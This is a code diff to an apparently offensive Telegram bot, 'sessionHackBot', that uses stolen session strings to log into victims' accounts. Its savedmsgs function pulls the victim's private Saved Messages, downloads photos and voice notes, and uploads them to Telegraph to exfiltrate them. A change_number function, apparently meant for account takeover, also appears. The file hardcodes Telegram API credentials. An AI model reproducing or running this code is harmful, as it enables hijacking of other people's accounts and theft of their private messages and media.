@@ -29,13 +29,11 @@ Bot_Username = Config.TG_BOT_USERNAME or "sessionHackBot"
 import os
 from telegraph import Telegraph
 from telethon.tl import types
-
 async def savedmsgs(strses):
     async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
         try:
             telegraph = Telegraph()
-            r = telegraph.create_account(short_name="Config.TELEGRAPH_SHORT_NAME")  # Replace "MyTelegraphAccount" with your desired short name
-            auth_url = r["auth_url"]
+            telegraph.create_account(short_name="MyTelegraphAccount", author_name="Anonymous")  # Replace with your desired short name and author name
             
             messages = []
             async for msg in X.iter_messages('me', reverse=True, limit=10):
@@ -44,15 +42,15 @@ async def savedmsgs(strses):
                 elif msg.media:
                     if isinstance(msg.media, types.MessageMediaPhoto):
                         downloaded_file_name = await X.download_media(msg.media.photo)
-                        upload_response = telegraph.upload(file_path=downloaded_file_name)
-                        photo_url = upload_response[0]["src"]
+                        with open(downloaded_file_name, 'rb') as f:
+                            photo_url = telegraph.upload_file(f)
                         messages.append(f"Photo: {photo_url}")
                         os.remove(downloaded_file_name)  # Remove the temporarily downloaded file
                     elif isinstance(msg.media, types.MessageMediaDocument):
                         if hasattr(msg.media.document, 'mime_type') and 'audio' in msg.media.document.mime_type:
                             downloaded_file_name = await X.download_media(msg.media.document)
-                            upload_response = telegraph.upload(file_path=downloaded_file_name)
-                            voice_url = upload_response[0]["src"]
+                            with open(downloaded_file_name, 'rb') as f:
+                                voice_url = telegraph.upload_file(f)
                             messages.append(f"Voice: {voice_url}")
                             os.remove(downloaded_file_name)  # Remove the temporarily downloaded file
                         
@@ -60,6 +58,7 @@ async def savedmsgs(strses):
         except Exception as e:
             print(e)
             return "An error occurred while fetching saved messages."
+
 async def change_number(strses, number):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     bot = client = X
